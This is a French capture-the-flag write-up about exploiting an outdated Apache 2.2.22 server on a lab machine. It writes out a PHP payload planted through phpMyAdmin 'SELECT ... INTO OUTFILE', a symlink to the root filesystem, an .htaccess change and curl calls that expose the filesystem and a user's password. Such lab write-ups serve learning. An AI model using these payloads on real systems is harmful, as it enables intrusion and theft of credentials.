## BONUS 6
### APACHE

Lorsque nous lancons la commande suivante : 

```
nikto -h https://192.168.1.135
```

Nous pouvons voir sur le retour la ligne suivante :
```
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
```

Essayons donc de trouver des vulnerabilités pour cette version de Apache..
Pour cela allons faire un tour sur le site suivant :

[exploit-db](https://www.exploit-db.com/)

Dans la barre de recherche nous rentrons apache privilege et regardons les exploit disponibles :

[b2r_4](../photos/b2r_4.png)

Nous allons aller sur Apache suEXEC et etudier l'exploit comme c'est le seul disponible en remote.

En bas de l'explication on voit bien que la version est la meme que la notre (Apache 2.2.22), c'est deja bon signe.

La fonctionnalité suEXEC offre aux utilisateurs d'Apache la possibilité d'exécuter des programmes CGI et SSI sous des identifiants différents de l'identifiant du serveur web appelant

On va creer un fichier suexec.php dans /var/www/forum/templates_c avec le code suivant :

```
<?php
	system("ln -sf / test99.php");
	symlink("/", "test99.php");
?>

select '<?php system(\"ln -sf / test99.php\"); symlink(\"/\", \"test99.php\"); ?>' into outfile "/var/www/forum/templates_c/suexec.php"
```

Puis depuis phpmyadmin on va creer un fichier .htaccess avec a l'interieur :

```
Options Indexes FollowSymLinks
select "Options Indexes FollowSymLinks" into outfile "/var/www/forum/templates_c/.htaccess"
```

On execute suexec.php via le browser ou avec curl :

```
curl --insecure https://192.168.1.135/forum/templates_c/suexec.php
```

Ensuite on appelle la page test99.php directement avec le browser

```
https://192.168.1.135/forum/templates_c/test99.php
```

Et finalement nous avons :

[b2r_5](../photos/b2r_5.png)

Il ne nous reste plus qu'a aller dans le /home, recuperer le password de laurie et continuer l'exploit comme dans le writeup1.md pour arriver root !
